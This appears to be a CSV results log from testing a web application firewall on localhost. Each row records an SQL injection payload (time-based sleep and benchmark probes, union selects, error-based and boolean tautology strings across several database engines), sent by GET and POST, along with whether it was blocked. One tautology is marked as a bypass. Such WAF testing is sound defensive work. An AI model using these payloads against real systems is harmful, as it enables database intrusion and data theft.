probe_index,source_row,method,payload,url,status,blocked,outcome,request_sent,url_length,latency_ms,attempts,error
2195,1534,POST,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",http://localhost:18080/,403,True,blocked,True,23,7.199,1,
2196,6279,GET,1'+  (  select 'iify' where 6257  =  6257 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',http://localhost:18080/?payload=1%27%2B++%28++select+%27iify%27+where+6257++%3D++6257+or+6793++%3D++++%28++select+6793+from+pg_sleep++%28++5+++%29++++%29+++++%29++%2B%27,403,True,blocked,True,169,6.169,1,
2197,6279,POST,1'+  (  select 'iify' where 6257  =  6257 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',http://localhost:18080/,403,True,blocked,True,23,7.711,1,
2198,2753,GET,"select count  (  *  )   from generate_series  (  1,5000000  )  #",http://localhost:18080/?payload=select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000++%29++%23,403,True,blocked,True,110,6.52,1,
2199,2753,POST,"select count  (  *  )   from generate_series  (  1,5000000  )  #",http://localhost:18080/,403,True,blocked,True,23,5.395,1,
2200,5889,GET,"1""   )    )    as uycc where 4364  =  4364 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",http://localhost:18080/?payload=1%22+++%29++++%29++++as+uycc+where+4364++%3D++4364+and+char++%28++107++%29++%7C%7Cchar++%28++121++%29++%7C%7Cchar++%28++97++%29++%7C%7Cchar++%28++80++%29++++%3D++regexp_substring++%28++repeat++%28++left++%28++crypt_key++%28++char++%28++65++%29++%7C%7Cchar++%28++69++%29++%7C%7Cchar++%28++83++%29++%2Cnull++%29++%2C0++%29++%2C500000000++%29++%2Cnull++%29++--,403,True,blocked,True,389,6.29,1,
2201,5889,POST,"1""   )    )    as uycc where 4364  =  4364 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",http://localhost:18080/,403,True,blocked,True,23,6.75,1,
2202,2175,GET,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,http://localhost:18080/?payload=1+or+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++ydpu++%29++%23+lwfs,403,True,blocked,True,135,5.953,1,
2203,2175,POST,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,http://localhost:18080/,403,True,blocked,True,23,5.948,1,
2204,143,GET,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--",http://localhost:18080/?payload=select+count++%28++%2A++%29+++from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3--,403,True,blocked,True,134,5.246,1,
2205,143,POST,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--",http://localhost:18080/,403,True,blocked,True,23,5.392,1,
2206,3367,GET,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'zizo' like 'zizo",http://localhost:18080/?payload=1%27+++%29++++%29++++and+elt++%28++1210++%3D++1210%2Csleep++%28++5+++%29++++%29++++and++++%28++++%28+++%27zizo%27+like+%27zizo,403,True,blocked,True,158,6.202,1,
2207,3367,POST,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'zizo' like 'zizo",http://localhost:18080/,403,True,blocked,True,23,6.098,1,
2208,5390,GET,-6222   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   3230  =  3230,http://localhost:18080/?payload=-6222+++%29++++%29++++or+4493++%3D++utl_inaddr.get_host_address++%28++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++4493++%3D++4493++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29++++and++++%28++++%28+++3230++%3D++3230,403,True,blocked,True,509,9.222,1,
2209,5390,POST,-6222   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   3230  =  3230,http://localhost:18080/,403,True,blocked,True,23,12.128,1,
2210,992,GET,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",http://localhost:18080/?payload=++%28++select+1+from+generate_series++%28++8515%2C8515%2Ccase+when+++%28++8515++%3D++3477++%29+++then+1+else+0+end++%29+++limit+1++%29++,403,True,blocked,True,168,10.637,1,
2211,992,POST,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",http://localhost:18080/,403,True,blocked,True,23,14.467,1,
2212,2710,GET,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,http://localhost:18080/?payload=1%27++%29+++or+sleep++%28++5++%29+++and+++%28++%27fizk%27++%3D++%27fizk,403,True,blocked,True,103,12.249,1,
2213,2710,POST,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,http://localhost:18080/,403,True,blocked,True,23,11.946,1,
2214,3761,GET,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",http://localhost:18080/?payload=1%22+++%29++++%29+++++%29+++and+make_set++%28++6751++%3D++8128%2C8128++%29+++and++++%28++++%28+++++%28++%22uhiy%22++%3D++%22uhiy,403,True,blocked,True,160,13.366,1,
2215,3761,POST,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",http://localhost:18080/,403,True,blocked,True,23,13.228,1,
2216,3435,GET,"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'xngr'  =  'xngr",http://localhost:18080/?payload=1%27+++%29++++%29+++++%29+++and+6537++%3D++dbms_pipe.receive_message++%28++chr++%28++76++%29++%7C%7Cchr++%28++116++%29++%7C%7Cchr++%28++117++%29++%7C%7Cchr++%28++65++%29++%2C5++%29+++and++++%28++++%28+++++%28++%27xngr%27++%3D++%27xngr,403,True,blocked,True,266,8.47,1,
2217,3435,POST,"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'xngr'  =  'xngr",http://localhost:18080/,403,True,blocked,True,23,8.375,1,
2218,3732,GET,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",http://localhost:18080/?payload=++%28++select+++%28++case+when+++%28++1938++%3D++1938++%29+++then+dbms_pipe.receive_message++%28++chr++%28++118++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++76++%29++%2C5++%29+++else+1938+end++%29+++from+dual++%29++,403,True,blocked,True,276,8.36,1,
2219,3732,POST,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",http://localhost:18080/,403,True,blocked,True,23,8.085,1,
2220,1042,GET,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',http://localhost:18080/?payload=1%27%7C%7C++%28++select+%27ovlx%27+where+8767++%3D++8767+or+sleep++%28++5+++%29++++%29+++%7C%7C%27,403,True,blocked,True,130,7.709,1,
2221,1042,POST,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',http://localhost:18080/,403,True,blocked,True,23,7.814,1,
2222,5283,GET,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey",http://localhost:18080/?payload=1%27++%29+++and+6414++%3D++++%28++select+count++%28++%2A++%29+++from+rdb%24fields+as+t1%2Crdb%24types+as+t2%2Crdb%24collations+as+t3%2Crdb%24functions+as+t4++%29+++and+++%28++%27zcey%27++%3D++%27zcey,403,True,blocked,True,231,8.102,1,
2223,5283,POST,"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey",http://localhost:18080/,403,True,blocked,True,23,7.704,1,
2224,1731,GET,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",http://localhost:18080/?payload=select+benchmark++%28++5000000%2Cmd5++%28++0x4c4d6142+++%29++++%29++++and+++%28++%27qfsu%27++%3D++%27qfsu,403,True,blocked,True,137,6.735,1,
2225,1731,POST,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu",http://localhost:18080/,403,True,blocked,True,23,6.768,1,
2226,1605,GET,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,http://localhost:18080/?payload=select+pg_sleep++%28++5++%29+++and++++%28++++%28+++++%28++9476++%3D++9476,403,True,blocked,True,105,5.581,1,
2227,1605,POST,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,http://localhost:18080/,403,True,blocked,True,23,6.835,1,
2228,4882,GET,"-7574%""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,http://localhost:18080/?payload=-7574%25%22++%29+++or+5023++%3D++ctxsys.drithsx.sn++%28++5023%2C++%28++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++5023++%3D++5023++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29+++++%29+++and+++%28++%22%25%22++%3D++%22,403,True,blocked,True,512,6.047,1,
2229,4882,POST,"-7574%""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,http://localhost:18080/,403,True,blocked,True,23,5.9,1,
2230,6392,GET,1' and 7533  =  7533 and 'clqy' like 'clqy,http://localhost:18080/?payload=1%27+and+7533++%3D++7533+and+%27clqy%27+like+%27clqy,403,True,blocked,True,84,5.67,1,
2231,6392,POST,1' and 7533  =  7533 and 'clqy' like 'clqy,http://localhost:18080/,403,True,blocked,True,23,6.562,1,
2232,95,GET,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",http://localhost:18080/?payload=1%27+in+boolean+mode++%29+++and+8635++%3D++++%28++select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000+++%29++++%29+++--,403,True,blocked,True,168,8.501,1,
2233,95,POST,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",http://localhost:18080/,403,True,blocked,True,23,8.655,1,
2234,166,GET,"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",http://localhost:18080/?payload=1%27+++%29++++%29+++++%29+++and+9660++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++--,403,True,blocked,True,198,9.366,1,
2235,166,POST,"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",http://localhost:18080/,403,True,blocked,True,23,11.548,1,
2236,1345,GET,1'  )   where 3187  =  3187 order by 1#,http://localhost:18080/?payload=1%27++%29+++where+3187++%3D++3187+order+by+1%23,403,True,blocked,True,79,10.79,1,
2237,1345,POST,1'  )   where 3187  =  3187 order by 1#,http://localhost:18080/,403,True,blocked,True,23,10.881,1,
2238,6165,GET,"1%' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",http://localhost:18080/?payload=1%25%27+and+8312++%3D++dbms_pipe.receive_message++%28++chr++%28++69++%29++%7C%7Cchr++%28++79++%29++%7C%7Cchr++%28++101++%29++%7C%7Cchr++%28++68++%29++%2C5++%29++--,403,True,blocked,True,195,12.471,1,
2239,6165,POST,"1%' and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",http://localhost:18080/,403,True,blocked,True,23,13.182,1,
2240,5216,GET,"1'   )    )    union all select null,null,null,null,null,null,null,null--",http://localhost:18080/?payload=1%27+++%29++++%29++++union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,403,True,blocked,True,125,8.598,1,
2241,5216,POST,"1'   )    )    union all select null,null,null,null,null,null,null,null--",http://localhost:18080/,403,True,blocked,True,23,8.209,1,
2242,1867,GET,-5137  )   or 9323  =  9323#,http://localhost:18080/?payload=-5137++%29+++or+9323++%3D++9323%23,403,True,blocked,True,66,7.505,1,
2243,1867,POST,-5137  )   or 9323  =  9323#,http://localhost:18080/,403,True,blocked,True,23,6.578,1,
2244,1594,GET,"1  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",http://localhost:18080/?payload=1++%29+++and+8189++%3D++++%28++select+count++%28++%2A++%29+++from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3++%29++--,403,True,blocked,True,179,7.631,1,
2245,1594,POST,"1  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",http://localhost:18080/,403,True,blocked,True,23,8.123,1,
2246,4977,GET,"1%"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,http://localhost:18080/?payload=1%25%22+or+8421++%3D++++%28++select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000+++%29++++%29++++and+%22%25%22++%3D++%22,403,True,blocked,True,169,6.693,1,
2247,4977,POST,"1%"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,http://localhost:18080/,403,True,blocked,True,23,6.526,1,
2248,5030,GET,or 1  =  1 --,http://localhost:18080/?payload=or+1++%3D++1+--,200,False,bypass,True,47,6.538,1,
2249,5030,POST,or 1  =  1 --,http://localhost:18080/,200,False,bypass,True,23,6.898,1,
2250,5015,GET,1' rlike   (  select   (  case when   (  5384  =  7060  )   then 1 else 0x28 end   )    ) ,http://localhost:18080/?payload=1%27+rlike+++%28++select+++%28++case+when+++%28++5384++%3D++7060++%29+++then+1+else+0x28+end+++%29++++%29+,403,True,blocked,True,138,7.194,1,
2251,5015,POST,1' rlike   (  select   (  case when   (  5384  =  7060  )   then 1 else 0x28 end   )    ) ,http://localhost:18080/,403,True,blocked,True,23,6.656,1,
2252,2228,GET,"1'+  (  select kqac where 4362  =  4362 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",http://localhost:18080/?payload=1%27%2B++%28++select+kqac+where+4362++%3D++4362+and+8312++%3D++dbms_pipe.receive_message++%28++chr++%28++69++%29++%7C%7Cchr++%28++79++%29++%7C%7Cchr++%28++101++%29++%7C%7Cchr++%28++68++%29++%2C5++%29++--,403,True,blocked,True,235,7.404,1,
2253,2228,POST,"1'+  (  select kqac where 4362  =  4362 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",http://localhost:18080/,403,True,blocked,True,23,6.463,1,
2254,1284,GET,"1""  )   where 3084  =  3084 union all select null,null--",http://localhost:18080/?payload=1%22++%29+++where+3084++%3D++3084+union+all+select+null%2Cnull--,403,True,blocked,True,96,5.715,1,
2255,1284,POST,"1""  )   where 3084  =  3084 union all select null,null--",http://localhost:18080/,403,True,blocked,True,23,7.206,1,
2256,4568,GET,1'||  (  select 'xhcr' from dual where 9279  =  9279,http://localhost:18080/?payload=1%27%7C%7C++%28++select+%27xhcr%27+from+dual+where+9279++%3D++9279,403,True,blocked,True,98,6.199,1,
2257,4568,POST,1'||  (  select 'xhcr' from dual where 9279  =  9279,http://localhost:18080/,403,True,blocked,True,23,6.737,1,
2258,1311,GET,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",http://localhost:18080/?payload=1%25%27++%29+++and+extractvalue++%28++7982%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++elt++%28++7982++%3D++7982%2C1+++%29++++%29+++++%29++%2C0x717a767a71+++%29++++%29++++and+++%28++%27%25%27++%3D++%27,403,True,blocked,True,247,6.579,1,
2259,1311,POST,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",http://localhost:18080/,403,True,blocked,True,23,6.411,1,
2260,1258,GET,"1%""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,http://localhost:18080/?payload=1%25%22+++%29++++%29+++++%29+++and+6240++%3D++++%28++%27qqpjq%27%7C%7C++%28++select+case+6240+when+6240+then+1+else+0+end+from+rdb%24database++%29++%7C%7C%27qzvzq%27++%29+++and++++%28++++%28+++++%28++%22%25%22++%3D++%22,403,True,blocked,True,251,9.54,1,
2261,1258,POST,"1%""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,http://localhost:18080/,403,True,blocked,True,23,10.069,1,
2262,903,GET,or 'whatever' in   (  'whatever'  ) ,http://localhost:18080/?payload=or+%27whatever%27+in+++%28++%27whatever%27++%29+,403,True,blocked,True,80,10.141,1,
2263,903,POST,or 'whatever' in   (  'whatever'  ) ,http://localhost:18080/,403,True,blocked,True,23,13.003,1,
2264,225,GET," union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",http://localhost:18080/?payload=+union+++%28++select+NULL%2C+NULL%2C+NULL%2C++++%28++select+%40%40version+++%29++++%29++++--,403,True,blocked,True,124,12.971,1,
2265,225,POST," union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",http://localhost:18080/,403,True,blocked,True,23,12.112,1,
